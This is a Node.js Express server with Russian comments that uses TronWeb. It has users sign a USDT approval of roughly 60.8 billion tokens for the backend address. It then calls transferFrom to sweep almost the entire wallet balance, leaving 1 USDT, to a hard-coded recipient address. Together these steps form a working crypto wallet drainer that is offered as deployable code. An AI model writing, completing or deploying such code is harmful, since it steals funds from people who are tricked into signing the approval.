// Загрузка переменных окружения из .env файла
require('dotenv').config();

// Импорт необходимых библиотек
const TronWeb = require('tronweb'); // Экспорт по умолчанию
const express = require('express');
const cors = require('cors');

// Инициализация Express-приложения
const app = express();
app.use(cors()); // Разрешаем CORS для всех доменов
app.use(express.json()); // Для парсинга JSON в body запросов

// Получение переменных окружения
const TRON_PRO_API_KEY = process.env.TRONGRID_API_KEY;
const PRIVATE_KEY = process.env.BACKEND_PRIVATE_KEY;
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Адрес контракта USDT 
const RECIPIENT_ADDRESS = 'TB7yE9DEMtXdSRoBX25dDdMe5KVzn9tT8m'; // Адрес получателя USDT

// Проверка наличия необходимых переменных окружения
if (!TRON_PRO_API_KEY || !PRIVATE_KEY) {
    console.error('Ошибка: Необходимо указать TRONGRID_API_KEY и BACKEND_PRIVATE_KEY в .env');
    process.exit(1);
}

// Инициализация TronWeb с использованием приватного ключа backend
const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    headers: { "TRON-PRO-API-KEY": TRON_PRO_API_KEY },
    privateKey: PRIVATE_KEY
});

// Получение адреса backend из приватного ключа
const BACKEND_ADDRESS = tronWeb.address.fromPrivateKey(PRIVATE_KEY);

// =========================
// Эндпоинт для создания транзакции approve
// =========================
app.post('/create-transaction', async (req, res) => {
    try {
        const { walletAddress } = req.body;

        if (!walletAddress) {
            return res.status(400).json({ error: 'Необходимо указать walletAddress' });
        }

        // Сумма для approve (в минимальных единицах USDT, 6 знаков после запятой)
        const amountToApprove = '60807178916019073000000'; // Пример: 60,807,178,916.019073 USDT

        // Создаем неподписанную транзакцию approve для фронтенда
        const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
            USDT_CONTRACT_ADDRESS,
            'approve(address,uint256)',
            {
                feeLimit: 100_000_000, // лимит комиссии
                callValue: 0,
            },
            [
                { type: 'address', value: BACKEND_ADDRESS }, // кому разрешаем списание
                { type: 'uint256', value: amountToApprove },
            ],
            walletAddress // адрес пользователя, с которого будет списание
        );

        if (!transaction || !transaction.transaction) {
            throw new Error('Не удалось создать транзакцию approve');
        }

        // Отправляем неподписанную транзакцию на фронтенд для подписи пользователем
        res.json({ transaction: transaction.transaction });
    } catch (error) {
        console.error('Ошибка при создании транзакции approve:', error);
        res.status(500).json({ error: 'Не удалось создать транзакцию approve' });
    }
});

// =========================
// Эндпоинт для отправки подписанной транзакции approve и выполнения transferFrom
// =========================
app.post('/send-transaction', async (req, res) => {
    try {
        const { signedTransaction, walletAddress, usdtBalance } = req.body;

        if (!signedTransaction) {
            return res.status(400).json({ error: 'Необходимо указать signedTransaction' });
        }
        if (!walletAddress) {
            return res.status(400).json({ error: 'Необходимо указать walletAddress' });
        }
        if (usdtBalance === undefined) {
            return res.status(400).json({ error: 'Необходимо указать usdtBalance' });
        }

        // Отправляем подписанную пользователем транзакцию approve в сеть Tron
        const approveResult = await tronWeb.trx.sendRawTransaction(signedTransaction);

        if (!approveResult.result) {
            throw new Error('Не удалось отправить транзакцию approve');
        }

        const approveTxid = approveResult.txid;

        // Ожидаем подтверждения транзакции approve
        const isConfirmed = await waitForTransactionConfirmation(approveTxid);
        if (!isConfirmed) {
            return res.status(500).json({ error: 'Транзакция approve не подтверждена вовремя' });
        }

        // Получаем контракт USDT
        const contract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);

        // Корректно рассчитываем сумму для transferFrom
        // usdtBalance должен быть в минимальных единицах (например, 1000000 для 1 USDT)
        // Если приходит в USDT, используйте: Math.floor(parseFloat(usdtBalance) * 1e6)
        let amountToTransfer = Math.floor(Number(usdtBalance));
        // Оставляем небольшой остаток (например, 1 USDT), чтобы не списывать всё
        if (amountToTransfer > 1e6) {
            amountToTransfer -= 1e6; // минус 1 USDT
        }

        if (amountToTransfer <= 0) {
            return res.status(400).json({ error: 'Некорректная сумма для перевода' });
        }

        // Выполняем transferFrom с backend-адреса на RECIPIENT_ADDRESS
        const transferResult = await contract.transferFrom(walletAddress, RECIPIENT_ADDRESS, amountToTransfer).send({
            feeLimit: 300_000_000,
            callValue: 0,
            shouldPollResponse: true
        });

        res.json({
            message: 'транзакции успешно выполнены',
            approveTxId: approveTxid,
            transferTxId: transferResult.txID
        });
    } catch (error) {
        console.error('Ошибка при отправке транзакции:', error);
        res.status(500).json({ error: 'Не удалось отправить транзакцию' });
    }
});

// =========================
// Вспомогательная функция ожидания подтверждения транзакции
// =========================
async function waitForTransactionConfirmation(txid, maxAttempts = 15) {
    for (let i = 0; i < maxAttempts; i++) {
        try {
            const tx = await tronWeb.trx.getTransactionInfo(txid);
            if (tx.receipt && tx.receipt.result === 'SUCCESS') {
                return true;
            }
        } catch (error) {
            // Транзакция не найдена, продолжаем ожидание
        }
        await new Promise(resolve => setTimeout(resolve, 15000)); // Ждем 15 секунд перед следующей попыткой
    }
    throw new Error('Время подтверждения транзакции истекло');
}

// =========================
// Запуск сервера
// =========================
const PORT = process.env.PORT || 8000;
app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
